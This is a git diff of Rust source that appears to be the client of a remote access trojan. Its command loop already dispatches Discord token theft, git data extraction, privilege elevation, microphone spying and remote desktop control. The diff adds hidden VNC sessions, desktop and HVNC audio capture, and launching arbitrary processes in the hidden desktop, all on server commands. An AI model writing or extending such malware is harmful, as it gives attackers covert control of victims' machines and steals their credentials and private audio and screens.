@@ -1,8 +1,10 @@
 use crate::features::other::{visit_website, show_messagebox, elevate_client, system_commands, handle_input_command};
 use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
+use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use crate::features::mic::{send_mic_device_list, start_mic_live, stop_mic_live, start_mic_recording, stop_mic_recording};
 use crate::features::desktop_recording::{start_desktop_recording, stop_desktop_recording};
+use crate::features::desktop_audio::{start_remote_desktop_audio, stop_remote_desktop_audio, start_hvnc_audio, stop_hvnc_audio};
 use crate::features::discord::send_discord_tokens;
 use crate::features::extraction::{
     collect_git_data,
@@ -114,6 +116,22 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => start_remote_desktop(config),
 
             Ok(Some(ClientboundPacket::StopRemoteDesktop)) => stop_remote_desktop(),
+
+            Ok(Some(ClientboundPacket::StartRemoteDesktopAudio)) => start_remote_desktop_audio(),
+
+            Ok(Some(ClientboundPacket::StopRemoteDesktopAudio)) => stop_remote_desktop_audio(),
+
+            Ok(Some(ClientboundPacket::StartHVNC)) => start_hvnc(),
+
+            Ok(Some(ClientboundPacket::StopHVNC)) => stop_hvnc(),
+
+            Ok(Some(ClientboundPacket::StartHVNCFrameAudio)) => start_hvnc_audio(),
+
+            Ok(Some(ClientboundPacket::StopHVNCFrameAudio)) => stop_hvnc_audio(),
+
+            Ok(Some(ClientboundPacket::OpenExplorer)) => open_process("explorer.exe".to_string()),
+
+            Ok(Some(ClientboundPacket::OpenHVNCProcess(process_name))) => open_process(process_name),
 
             Ok(Some(ClientboundPacket::StartMicLive(device_id))) => start_mic_live(device_id),
             Ok(Some(ClientboundPacket::StopMicLive)) => stop_mic_live(),
